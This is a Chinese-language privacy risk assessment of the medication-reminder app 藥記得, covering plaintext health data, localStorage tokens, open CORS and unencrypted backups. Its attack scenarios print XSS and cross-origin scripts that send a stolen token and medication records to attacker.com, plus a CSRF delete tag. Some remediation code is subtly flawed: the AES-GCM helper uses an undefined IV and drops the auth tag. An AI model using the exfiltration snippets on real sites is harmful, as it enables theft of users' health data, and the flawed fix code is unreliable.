# 👥 藥記得 App 用戶隱私風險評估

**評估日期:** 2026-06-16 19:50 GMT+8  
**評估對象:** 用戶隱私保護  
**評估標準:** GDPR + 台灣個資法 + CCPA  
**風險等級:** 🔴 **高風險**

---

## 📊 隱私風險概況

| 項目 | 目前狀態 | 風險等級 | 影響用戶 |
|------|---------|---------|---------|
| **健康敏感數據加密** | ❌ 無 | 🔴 高 | 100% |
| **Token 存儲安全** | ❌ localStorage | 🔴 高 | 100% |
| **跨域數據洩露** | ❌ 無限制 | 🔴 高 | 100% |
| **用藥隱私（家庭成員）** | ⚠️ 控制存在 | 🟠 中 | 50% |
| **數據備份加密** | ❌ 無 | 🔴 高 | 100% |
| **用戶同意管理** | ✅ 存在 | 🟢 低 | 0% |

---

## 🚨 **用戶隱私威脅分析**

### 威脅 #1：健康數據完全暴露
**風險：** 💥 **最嚴重**

#### 當前狀況
藥記得收集以下極度敏感的健康數據，**完全以明文存儲**：

- **血壓數據** - sys/dia (收縮壓/舒張壓)
- **血糖數據** - 用於診斷糖尿病
- **體重數據** - 用於計算 BMI
- **用藥記錄** - 患有哪些疾病
- **服用時間** - 作息模式
- **心情記錄** - 精神健康狀況
- **其他筆記** - 個人健康觀察

#### 攻擊場景

**情景 1：資料庫洩露**
```
假如黑客入侵伺服器竊取 medremind.db
→ 所有用戶的完整健康檔案完全暴露
→ 可以關聯個人身份（email + 電話）
→ 可被賣給保險公司或歧視性組織
```

**情景 2：備份文件洩露**
```
備份文件 medremind_backup.db 存放在不安全位置
→ 攻擊者下載備份
→ 所有歷史健康數據都被竊取
→ 無法追溯誰偷了它
```

**情景 3：中間人攻擊（無 HTTPS）**
```
用戶在公開 WiFi 連接應用
→ 攻擊者截獲所有 API 請求
→ 清楚看到用戶的血壓、血糖、用藥等信息
→ 可以實時竊聽用戶的隱私數據
```

#### 法律後果
- **GDPR:** 違反「資料最小化」和「完整性」原則 → €20M 罰款
- **台灣個資法:** 違反第 5 條「安全維護」→ NT$5-50M 罰款
- **CCPA:** 違反數據安全義務 → 用戶可提起訴訟

---

### 威脅 #2：Token 被 XSS 攻擊竊取
**風險：** 💥 **非常嚴重**

#### 當前狀況
JWT token 存儲在 **localStorage**（明文），JavaScript 可以直接存取：

```javascript
// localStorage 中的 token
"medremind_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwibmFtZSI6Ijmw9oCW5aSW6YGXIiwi..."
```

#### 攻擊場景
**XSS（跨站腳本）攻擊：**

```html
<!-- 惡意網站或被駭客注入到 medremind.com 的廣告 -->
<script>
// 1. 竊取 token
const token = localStorage.getItem('medremind_token');

// 2. 發送到攻擊者伺服器
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token, url: location.href })
});

// 3. 用竊取的 token 冒充用戶
fetch('http://localhost:8050/api/medications', {
    headers: { 'Authorization': 'Bearer ' + token }
}).then(r => r.json()).then(data => {
    // 攻擊者現在擁有用戶的完整用藥記錄
    console.log('Stolen meds:', data);
});
</script>
```

#### 被竊取 token 可以做什麼

| 操作 | 可能嗎 | 後果 |
|------|--------|------|
| 讀取所有用藥記錄 | ✅ 是 | 隱私完全暴露 |
| 讀取所有健康數據 | ✅ 是 | 隱私完全暴露 |
| 修改用藥記錄 | ✅ 是 | 可能造成用戶混亂 |
| 添加虛假健康數據 | ✅ 是 | 誤導用戶 |
| 刪除用藥記錄 | ✅ 是 | 用戶無法追蹤 |
| 查看家庭成員的數據 | ✅ 是 | 家人隱私洩露 |
| 30 天內冒充用戶 | ✅ 是 | 完整帳號接管 |

#### 法律後果
- **GDPR:** 違反「完整性和機密性」→ €20M 罰款
- **台灣個資法:** 非法取得個人資料罪 → 刑事責任

---

### 威脅 #3：CORS 允許任何網站存取
**風險：** 💥 **非常嚴重**

#### 當前狀況
```javascript
// server.js
app.use(cors());  // 允許所有來源！
```

#### 攻擊場景

**攻擊 #1：跨域資料竊取**
```html
<!-- evil.com 上的頁面 -->
<button onclick="stealData()">點我看有趣的東西</button>

<script>
function stealData() {
    // 用戶之前登入了 medremind.com，cookie 仍然有效
    fetch('http://localhost:8050/api/medications', {
        credentials: 'include'
    })
    .then(r => r.json())
    .then(data => {
        // 攻擊者現在有用戶的完整用藥記錄！
        fetch('https://attacker.com/log?meds=' + JSON.stringify(data));
    });
}
</script>
```

**攻擊 #2：CSRF（跨站請求偽造）**
```html
<!-- evil.com 上的釣魚頁面 -->
<img src="http://localhost:8050/api/medications/1/delete" />
<!-- 用戶在背景被默默刪除了用藥記錄！ -->
```

#### 法律後果
- **GDPR:** 未能防止未授權存取 → €20M 罰款
- **台灣個資法:** 違反保安責任 → NT$5-50M 罰款

---

### 威脅 #4：備份文件明文存儲
**風險:** 🔴 **高**

#### 當前狀況
當用戶下載備份時，得到一個 **medremind_backup.db** 文件，包含：

```
medremind_backup.db (95KB)
├── 所有用藥記錄
├── 所有健康數據
├── 所有家庭成員信息
├── 用戶 email 和電話
└── 完全可讀 ❌
```

#### 攻擊場景
```
1. 用戶下載備份存放在雲端 (Google Drive、OneDrive)
2. 帳號被駭客入侵
3. 備份文件被完全下載
4. 攻擊者得到完整的健康檔案

或

1. 用戶電腦被惡意軟件感染
2. 備份文件被竊取
3. 所有健康記錄暴露
```

---

### 威脅 #5：家庭成員的用藥隱私洩露
**風險:** 🟠 **中等**

#### 當前狀況
添加家庭成員後，該成員可以看到的信息：

```javascript
// 家庭成員可以看到
{
  medication_id: 1,
  drug_name: "降血壓藥",        // ← 知道你有高血壓
  dosage: "1 顆",
  remind_time: ["08:00", "20:00"],
  today_status: [
    { time: "08:00", taken: true },
    { time: "20:00", taken: false }
  ],
  adherence_rate: 85%  // ← 知道你的遵從率
}
```

#### 隱私問題

| 情況 | 洩露內容 | 後果 |
|------|---------|------|
| 女兒看父親的記錄 | 有糖尿病、高血壓、膽固醇 | 可能擔心父親健康；可能與父親產生矛盾 |
| 配偶看另一半的記錄 | 精神科用藥（抗憂鬱藥）| 可能造成污名化；影響婚姻；隱私侵犯 |
| 子女看父母的記錄 | 隱瞞的疾病或老年症狀 | 可能影響對父母的態度；造成擔憂 |

#### 法律後果
- **GDPR:** 在未明確同意下披露健康數據 → €20M 罰款
- **台灣個資法:** 第 6 條「特定目的」原則違反 → NT$5-50M 罰款

---

### 威脅 #6：無完整數據刪除證明
**風險:** 🟠 **中等**

#### 當前狀況
用戶刪除帳號時：

```javascript
app.delete('/api/user/account', auth, (req, res) => {
    dbRun('DELETE FROM medications WHERE user_id = ?', [uid]);
    dbRun('DELETE FROM medication_logs WHERE user_id = ?', [uid]);
    // ... 刪除其他表格
    res.json({ message:'帳號已刪除' });
});
```

#### 隱私風險

| 問題 | 影響 |
|------|------|
| **無審計日誌** | 無法證明數據何時被刪除 |
| **備份未刪除** | 備份中的數據仍然存在 |
| **舊備份** | 舊的備份文件仍在某處 |
| **GDPR 要求** | 用戶無法要求「被遺忘的權利」証明 |

#### 法律後果
- **GDPR 第 17 條**（被遺忘的權利）：無法證明刪除 → €20M 罰款

---

## 📋 **用戶隱私檢查清單**

### ❌ 缺失的隱私保護

- [ ] **無加密** - 敏感健康數據未加密存儲
- [ ] **無傳輸加密** - 未強制 HTTPS
- [ ] **Token 不安全** - localStorage 易被 XSS 竊取
- [ ] **無 CORS 限制** - 允許任何網站存取
- [ ] **備份未加密** - 備份文件可讀
- [ ] **無數據刪除審計** - 無法証明數據已刪除
- [ ] **無同意管理系統** - 無法記錄用戶同意
- [ ] **無端對端加密** - 伺服器可以讀取所有數據

### ✅ 現有的隱私保護

- [x] **隱私政策** - 有完整的隱私聲明
- [x] **用戶可刪除帳號** - 自主控制
- [x] **家庭成員權限控制** - 不是所有人都能看到
- [x] **密碼雜湊** - 密碼不以明文存儲
- [x] **數據分離** - 不同用戶的數據分開

---

## 🛡️ **建議的隱私保護措施**

### **第 1 級：緊急（本周）**

#### 1. 強制 HTTPS
```javascript
// 防止明文傳輸敏感數據
if (process.env.NODE_ENV === 'production') {
    app.use((req, res, next) => {
        if (!req.secure) res.redirect('https://' + req.headers.host + req.url);
        else next();
    });
}
```

#### 2. HttpOnly Cookie
```javascript
// 防止 XSS 竊取 token
res.cookie('auth_token', token, {
    httpOnly: true,
    secure: true,  // HTTPS only
    sameSite: 'Strict'
});
```

#### 3. CORS 白名單
```javascript
const whitelist = ['https://yourdomain.com', 'https://app.yourdomain.com'];
app.use(cors({
    origin: whitelist,
    credentials: true
}));
```

### **第 2 級：高優先級（2 周內）**

#### 4. 健康數據加密
```javascript
const crypto = require('crypto');

function encryptField(value) {
    const cipher = crypto.createCipheriv(
        'aes-256-gcm',
        Buffer.from(process.env.ENCRYPTION_KEY, 'hex'),
        iv
    );
    return cipher.update(value, 'utf8', 'hex') + cipher.final('hex');
}

// 使用範例
dbRun(
    'INSERT INTO health_records (..., blood_pressure_sys_enc) VALUES (..., ?)',
    [encryptField(bloodPressure)]
);
```

#### 5. 備份加密
```javascript
app.get('/api/backup/download', auth, (req, res) => {
    const db = fs.readFileSync(DB_FILE);
    const encrypted = encryptField(db.toString('base64'));
    res.json({ encrypted_backup: encrypted });
});
```

#### 6. 審計日誌
```javascript
async function auditLog(userId, action, dataType, timestamp) {
    dbRun(
        'INSERT INTO audit_logs (user_id, action, data_type, timestamp) VALUES (?, ?, ?, ?)',
        [userId, action, dataType, timestamp]
    );
}

// 監控所有敏感操作
auditLog(req.user.id, 'viewed', 'medications', new Date());
auditLog(req.user.id, 'deleted', 'health_records', new Date());
```

### **第 3 級：中期優化（1 個月內）**

#### 7. 數據最小化
```javascript
// ❌ 移除不必要的字段
// 不要返回未請求的敏感數據

// ✅ 只返回需要的字段
app.get('/api/medications', auth, (req, res) => {
    const meds = dbAll(
        'SELECT id, drug_name, dosage, remind_time FROM medications WHERE user_id=?',
        [req.user.id]
    );
    res.json({ medications: meds });
});
```

#### 8. 明確的同意管理
```javascript
// 添加用戶同意記錄
dbRun(
    'INSERT INTO user_consents (user_id, consent_type, version, timestamp) VALUES (?, ?, ?, ?)',
    [userId, 'health_data_collection', '1.0', new Date()]
);
```

#### 9. 家庭成員數據保護
```javascript
// 家庭成員只能看到特定字段
app.get('/api/family/:fid/medications', auth, (req, res) => {
    // 檢查權限
    const perm = dbGet(
        'SELECT permission_level FROM family_members WHERE user_id=? AND related_user_id=?',
        [req.user.id, req.params.fid]
    );
    
    if (perm.permission_level !== 'edit') {
        // 限制可見字段
        const meds = dbAll(
            'SELECT id, drug_name, dosage FROM medications WHERE user_id=?',
            [req.params.fid]
        );
        return res.json({ medications: meds });
    }
    // 完整數據...
});
```

---

## 📊 **隱私風險評分表**

### 修復前
```
數據加密:          1/10  ❌
傳輸安全:          1/10  ❌
Token 安全:        1/10  ❌
CORS 保護:         1/10  ❌
備份保護:          0/10  ❌
審計日誌:          0/10  ❌
用戶同意:          4/10  ⚠️
隱私政策:          8/10  ✅
━━━━━━━━━━━━━
隱私總評分:        2.0/10  🔴 高風險
```

### 修復後（目標）
```
數據加密:          9/10  ✅
傳輸安全:          9/10  ✅
Token 安全:        9/10  ✅
CORS 保護:         9/10  ✅
備份保護:          8/10  ✅
審計日誌:          8/10  ✅
用戶同意:          8/10  ✅
隱私政策:          9/10  ✅
━━━━━━━━━━━━━
隱私總評分:        8.6/10  🟢 低風險
```

---

## 🚨 **法律合規性檢查**

### 台灣個人資料保護法
| 條文 | 要求 | 目前狀態 | 優先級 |
|------|------|---------|--------|
| 第 5 條 | 安全維護 | ❌ 不符 | 🔴 P0 |
| 第 6 條 | 特定目的 | ⚠️ 部分 | 🟠 P1 |
| 第 11 條 | 告知義務 | ✅ 符合 | - |
| 第 15 條 | 存取權 | ✅ 符合 | - |

### GDPR（如有歐盟用戶）
| 文章 | 要求 | 目前狀態 | 優先級 |
|------|------|---------|--------|
| Art. 5 | 資料最小化 | ⚠️ 部分 | 🟠 P1 |
| Art. 32 | 安全 | ❌ 不符 | 🔴 P0 |
| Art. 17 | 被遺忘的權利 | ⚠️ 部分 | 🟠 P1 |
| Art. 33 | 違規通知 | ❌ 無機制 | 🟠 P1 |

---

## 📋 **用戶隱私建議清單**

### 立即行動
- [ ] 設置 HTTPS 強制
- [ ] 改用 HttpOnly Cookie
- [ ] 修復 CORS 白名單
- [ ] 移除硬編碼 token 演示

### 本周完成
- [ ] 健康數據加密
- [ ] 備份加密
- [ ] 添加審計日誌

### 本月完成
- [ ] 數據刪除確認機制
- [ ] 用戶同意管理系統
- [ ] 隱私政策更新

---

**評估完成:** 2026-06-16 21:00 GMT+8  
**評估員:** OpenClaw 隱私官  
**建議:** 立即實施 P0 措施，防止用戶隱私洩露
